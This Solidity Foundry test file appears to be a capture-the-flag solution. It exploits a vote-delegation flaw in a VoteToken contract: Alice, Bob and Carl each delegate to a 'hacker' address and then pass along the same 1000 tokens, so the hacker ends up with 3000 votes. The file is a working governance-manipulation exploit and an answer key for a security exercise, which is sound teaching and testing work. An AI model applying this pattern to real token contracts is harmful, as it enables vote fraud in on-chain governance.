// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/VotingMachine.sol";

contract ExploitVotingMachine is Test {
	VoteToken vToken;
	address public owner = address(0);
	address public hacker =address(1337);

	address public alice= address(1);
	address public bob = address(2);
	address public carl = address(3);

	function setUp() public {
		vm.startPrank(owner);
		vToken = new VoteToken();
		vToken.mint(alice, 1000);
		vm.stopPrank();
	}

	function testExploit() public {
vm.startPrank(alice);
		// soluiton

		// 1. Alice delegate to hacker and send balance to Bob
		vToken.delegate(hacker);
		vToken.transfer(bob, 1000);
vm.stopPrank();

vm.startPrank(bob);
		// 2. Bob delegate to hacker and send balance to Carl
		vToken.delegate(hacker);
		vToken.transfer(carl, 1000);
vm.stopPrank();

vm.startPrank(carl);
		// 3. Carl delegate to hacker and send balance to hacker
		vToken.delegate(hacker);
		vToken.transfer(hacker, 1000);
vm.stopPrank();

		uint hacker_vote = vToken.getVotes(hacker);
		console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

		uint hacker_balance= vToken.balanceOf(hacker);
		console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

		assertEq(hacker_vote , 3000);
		assertEq(hacker_balance, 1000);
	}
}
